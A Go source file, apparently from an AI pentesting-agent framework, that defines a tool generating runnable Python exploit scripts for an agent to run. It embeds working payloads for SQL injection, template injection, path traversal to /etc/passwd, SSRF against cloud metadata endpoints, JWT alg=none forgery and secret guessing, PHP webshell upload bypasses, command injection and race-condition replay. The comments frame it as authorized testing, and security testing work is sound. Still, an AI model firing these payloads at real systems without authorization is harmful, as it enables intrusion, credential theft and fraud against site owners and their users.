package agent

// PoC scaffold (v0.7.0): poc_scaffold.
//
// ## Why it exists
//
// The core of customer feedback was 'gives up at bottlenecks — can't produce new PoCs itself'. Field facts agree:
// workers write scattered curls but **never distill one verification into a re-runnable exploit script** —
// a param change means rewriting from scratch; one failure means declaring death.
//
// This tool generates a **runnable** Python skeleton per vuln class: baseline comparison, payload list,
// hit criteria, multi-thread/multi-identity templates pre-written — the model only edits URL/params/
// payloads per the real target, then runs it via run_script. It turns 'build a PoC' from zero-every-time into edit-a-template.
//
// The skeleton respects authorized-testing boundaries: it only sends requests and reads responses back — no destructive
// writes; hit criteria are always 'response diff / known marker' to avoid false positives.

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

const pocCommon = `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PoC scaffold (__CLASS__) — edit these three spots to use:
   BASE  = target address (argv[1] can override)
   PARAM = parameter name (argv[2])
   PAYLOADS = payload list
Criteria: lines starting with MATCH = hits; SUMMARY prints at the end.
"""
import sys, ssl, json, re, time, threading, urllib.request, urllib.parse, urllib.error

BASE  = sys.argv[1] if len(sys.argv) > 1 else "__BASE__"
PARAM = sys.argv[2] if len(sys.argv) > 2 else "__PARAM__"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}

def inject(base, param, payload):
    if "FUZZ" in base:
        return base.replace("FUZZ", urllib.parse.quote(payload, safe=""))
    u = urllib.parse.urlsplit(base)
    q = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
    q = [(k, v) for (k, v) in q if k != param] + [(param, payload)]
    return urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, urllib.parse.urlencode(q), u.fragment))

def fetch(url, method="GET", data=None, headers=None, timeout=15):
    h = dict(UA); h.update(headers or {})
    body = data.encode("utf-8", "replace") if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, method=method, headers=h)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, dict(r.headers), r.read(2_000_000), int((time.time()-t0)*1000)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1_000_000), int((time.time()-t0)*1000)
    except Exception as e:
        return 0, {}, str(e).encode(), int((time.time()-t0)*1000)

def show(label, status, body, ms):
    txt = body.decode("utf-8", "replace") if isinstance(body, bytes) else str(body)
    print(json.dumps({"probe": label, "status": status, "ms": ms, "len": len(txt), "head": txt[:300]}, ensure_ascii=False))

def finish(hits, total):
    print("SUMMARY hits=%d total=%d" % (len(hits), total))
    if not hits:
        print("[!] no hits: first confirm the baseline request reaches (status>0), then switch encoding/param position/payload source; don't declare dead from this.")
`

var pocTemplates = map[string]string{
	"sqli": `BASE_T = BASE
PAYLOADS = ["'", "\"", "')", "') OR '1'='1", "' OR '1'='1' -- -", "\" OR \"1\"=\"1", "1' AND SLEEP(3)-- -", "1) AND SLEEP(3)-- -"]
# expected run: python3 thisfile <url> <param> [--post]
POST = "--post" in sys.argv
hits = []
base_s, _, base_b, _ = (fetch(BASE, "POST", "x=1") if POST else fetch(BASE))
for p in PAYLOADS:
    url = inject(BASE_T, PARAM, p)
    st, _, bd, ms = (fetch(BASE_T, "POST", "%s=%s" % (PARAM, urllib.parse.quote(p))) if POST else fetch(url))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace").lower() if isinstance(bd, bytes) else str(bd).lower()
    sigs = ["sql syntax", "mysql_fetch", "ora-0", "postgresql", "unclosed quotation", "syntax error", "odbc", "jdbc"]
    if st in (500, 502) or any(s in low for s in sigs):
        hits.append(("error-based", p)); print("MATCH error-based payload=%r status=%s" % (p, st))
    elif "sleep" in p.lower() and ms >= 2500:
        hits.append(("time-based", p)); print("MATCH time-based payload=%r ms=%s" % (p, ms))
    elif len(low) > 0 and abs(len(low) - len(base_b.decode("utf-8","replace"))) > 80:
        hits.append(("bool-diff", p)); print("MATCH boolean-diff payload=%r len=%d base=%d" % (p, len(low), len(base_b)))
finish(hits, len(PAYLOADS))
`,
	"ssti": `PAYLOADS = ["{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "@(7*7)", "{{config}}", "{{''.__class__.__mro__}}"]
hits = []
for p in PAYLOADS:
    st, _, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if "49" in low or "7*7" in low and "7777777" in low:
        hits.append(p); print("MATCH ssti payload=%r status=%s" % (p, st))
    if "class" in low and "__mro__" in p:
        hits.append(p); print("MATCH ssti-class payload=%r" % p)
finish(hits, len(PAYLOADS))
`,
	"lfi": `PATHS = ["../../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd", "/etc/passwd%00", "..\..\..\..\windows\win.ini", "php://filter/convert.base64-encode/resource=index.php"]
hits = []
for p in PATHS:
    st, _, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if "root:x:0:0" in low or "[extensions]" in low.lower():
        hits.append(p); print("MATCH lfi payload=%r status=%s" % (p, st))
finish(hits, len(PATHS))
`,
	"ssrf": `# first replace CANARY with your own callback/HTTP-log address; metadata addresses only get read-only GETs
CANARY = "http://127.0.0.1:9/canary"
TARGETS = [CANARY, "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_PING"]
hits = []
for p in TARGETS:
    st, hd, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if st and (("ami-" in low) or ("computeMetadata" in low) or ("root:x:0:0" in low) or ("redis" in low.lower())):
        hits.append(p); print("MATCH ssrf payload=%r status=%s" % (p, st))
finish(hits, len(TARGETS))
`,
	"idor": `# usage: python3 thisfile <url-with-FUZZ-or-param> <param> <id1> <id2>
# two ids accessed as the same identity; compare status/length/key fields — a diff = enumerable-privesc lead (re-verify by switching to someone else's object).
ID1 = sys.argv[3] if len(sys.argv) > 3 else "1"
ID2 = sys.argv[4] if len(sys.argv) > 4 else "2"
hits = []
outs = {}
for ident in (ID1, ID2):
    st, _, bd, ms = fetch(inject(BASE, PARAM, ident))
    txt = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    outs[ident] = (st, txt)
    show("id=" + ident, st, bd, ms)
s1, t1 = outs[ID1]; s2, t2 = outs[ID2]
if s1 == 200 and s2 == 200 and t1 != t2:
    hits.append("both-200-diff"); print("MATCH idor ids=%s,%s len=%d/%d" % (ID1, ID2, len(t1), len(t2)))
elif s1 in (401,403) and s2 == 200:
    hits.append("auth-diff"); print("MATCH idor one-denied-one-succeeded ids=%s,%s" % (ID1, ID2))
finish(hits, 2)
`,
	"jwt": `import base64, hmac, hashlib
TOKEN = sys.argv[3] if len(sys.argv) > 3 else ""
def b64d(s):
    s += "=" * (-len(s) % 4); return base64.urlsafe_b64decode(s)
def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
print("[*] token length=%d" % len(TOKEN))
try:
    h, p, sig = TOKEN.split(".")
    print("[*] header=", b64d(h).decode("utf-8","replace"))
    print("[*] payload=", b64d(p).decode("utf-8","replace"))
except Exception as e:
    print("[!] token doesn't look like JWT: ", e)
    sys.exit(0)
# none algorithm
for alg in ("none", "None", "NONE"):
    forged = b64e(json.dumps({"alg": alg, "typ": "JWT"}).encode()) + "." + p + "."
    st, _, bd, ms = fetch(BASE, headers={"Authorization": "Bearer " + forged})
    show("alg=" + alg, st, bd, ms)
    if st == 200:
        print("MATCH jwt-none alg=%s" % alg)
# weak secret
SECRETS = ["secret", "password", "123456", "jwt", "changeme", "key", "test", "admin"]
hits = []
for sec in SECRETS:
    s = b64e(hmac.new(sec.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    st, _, bd, ms = fetch(BASE, headers={"Authorization": "Bearer " + h + "." + p + "." + s})
    if st == 200:
        hits.append(sec); print("MATCH jwt-weak-secret secret=%r" % sec)
finish(hits, len(SECRETS))
`,
	"upload": `# usage: python3 thisfile <upload_url> <param> [shell_content]
UPLOAD = BASE
FIELD = PARAM
SHELL = sys.argv[3] if len(sys.argv) > 3 else "<?php echo 'ok'; ?>"
BOUND = "----%d" % int(time.time())
NAMES = ["poc.php", "poc.php.jpg", "poc.php%00.jpg", "poc.pHp", "poc.php5", ".htaccess"]
hits = []
for name in NAMES:
    parts = []
    for k, v in (("name", name), ("content", SHELL)):
        parts.append('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (BOUND, k, v))
    parts.append('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n' % (BOUND, FIELD, name, SHELL))
    parts.append("--%s--\r\n" % BOUND)
    body = "".join(parts).encode()
    st, hd, bd, ms = fetch(UPLOAD, "POST", body, {"Content-Type": "multipart/form-data; boundary=" + BOUND})
    show(name, st, bd, ms)
    txt = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if st in (200, 201, 302) and re.search(r'(?i)(success|uploaded|upload succeeded|/upload|\.php)', txt):
        hits.append(name); print("MATCH upload name=%r status=%s" % (name, st))
finish(hits, len(NAMES))
print("[*] next step: find the landing address from the response/path pattern, visit via http_request and confirm echo; if not echo-type, try parse-execute.")
`,
	"cmdi": `PAYLOADS = [";id", "|id", "||id", "&id", "&&id", "$(id)", "%0aid", ";whoami", "|ping -c 1 127.0.0.1"]
hits = []
for p in PAYLOADS:
    st, _, bd, ms = fetch(inject(BASE, PARAM, p))
    show(p, st, bd, ms)
    low = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    if re.search(r"uid=\d+\(", low) or re.search(r"(?i)(windows|nt authority|administrator)", low):
        hits.append(p); print("MATCH cmdi payload=%r status=%s" % (p, st))
finish(hits, len(PAYLOADS))
`,
	"race": `# concurrently replay the same state-changing request (price change/coupon claim/withdrawal), check for >1 successes.
THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 20
PATH_KEY = sys.argv[4] if len(sys.argv) > 4 else PARAM
results = []
lock = threading.Lock()
def one(i):
    st, _, bd, ms = fetch(BASE, "POST", "%s=1" % PATH_KEY)
    txt = bd.decode("utf-8", "replace") if isinstance(bd, bytes) else str(bd)
    with lock:
        results.append((i, st, txt[:120]))
ths = [threading.Thread(target=one, args=(i,)) for i in range(THREADS)]
for t in ths: t.start()
for t in ths: t.join()
ok = [r for r in results if r[1] in (200, 201, 302)]
print(json.dumps({"total": len(results), "ok": len(ok), "sample": ok[:5]}, ensure_ascii=False))
if len(ok) > 1:
    print("MATCH race concurrent successes %d/%d — re-check business state (order/balance) to confirm duplicate effect" % (len(ok), THREADS))
else:
    print("[!] no concurrent success seen; try a more precise mutation endpoint / a valid token / a smaller interval.")
`,
}

func (t *ToolSet) pocScaffold() actool.CoreTool {
	classes := make([]string, 0, len(pocTemplates))
	for k := range pocTemplates {
		classes = append(classes, k)
	}
	sort.Strings(classes) // stable order in error hints — easier for model/human matching
	return readTool(
		"poc_scaffold",
		"Generates a [runnable Python exploit/verification skeleton] by vuln class into the task shared dir (shared/scripts), "+
			"returning the script path and run command. The skeleton carries baseline comparison, payload list and hit criteria — you only edit URL/params/payloads. "+
			"Classes: sqli/ssti/lfi/ssrf/idor/jwt/upload/cmdi/race.\n"+
			"This is the entry point for 'distilling a verification into a repeatable PoC': generate once → run_script → tweak payloads by output → rerun, "+
			"instead of hand-writing curl from zero every time. On no-hit the script prints troubleshooting hints — that's not 'vuln doesn't exist'.",
		obj(map[string]any{
			"vulnclass": str("vuln class: " + strings.Join(classes, "/")),
			"target":    str("target address; if it contains FUZZ it gets replaced by payloads, otherwise params are injected via param"),
			"param":     str("parameter name (e.g. id / url / file / q)"),
			"name":      str("script filename (optional, default <class>-<timestamp>.py)"),
		}, "vulnclass", "target"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				VulnClass string `json:"vulnclass"`
				Target    string `json:"target"`
				Param     string `json:"param"`
				Name      string `json:"name"`
			}
			_ = json.Unmarshal(in, &a)
			class := strings.ToLower(strings.TrimSpace(a.VulnClass))
			tpl, ok := pocTemplates[class]
			if !ok {
				return actool.Errorf("unsupported class: " + class + " (available: " + strings.Join(classes, "/") + ")"), nil
			}
			if strings.TrimSpace(a.Target) == "" {
				return actool.Errorf("target must not be empty"), nil
			}
			dir := t.sharedDir()
			if dir == "" {
				return actool.Errorf("task shared dir unavailable (runDir not injected)"), nil
			}
			param := strings.TrimSpace(a.Param)
			if param == "" {
				param = "id"
			}
			name := sanitizeScriptName(a.Name)
			if name == "" {
				name = fmt.Sprintf("%s-%d.py", class, time.Now().Unix()%100000)
			} else if !strings.HasSuffix(strings.ToLower(name), ".py") {
				name += ".py"
			}
			header := strings.NewReplacer(
				"__CLASS__", class,
				"__BASE__", pyQuote(a.Target),
				"__PARAM__", pyQuote(param),
			).Replace(pocCommon)
			content := header + "\n" + tpl
			path := filepath.Join(dir, "scripts", name)
			if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
				return actool.Errorf("failed to write the script: " + err.Error()), nil
			}
			return jsonResult(map[string]any{
				"path":      path,
				"vulnclass": class,
				"run_with_bash": fmt.Sprintf("timeout 300 python3 %s %s %s",
					shellQuote(path), shellQuote(a.Target), shellQuote(param)),
				"note": "run it once to see baseline and hits; tweak PAYLOADS/param positions per output, then run_script again. " +
					"Generated is a skeleton, not a finished product — treat it as a starting point; hit criteria must be writable into report_finding's evidence.",
			})
		},
	)
}

// pyQuote safely embeds a string into a Python single-quoted literal (for default values).
func pyQuote(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `'`, `\'`)
	s = strings.ReplaceAll(s, "\n", `\n`)
	s = strings.ReplaceAll(s, "\r", `\r`)
	return s
}
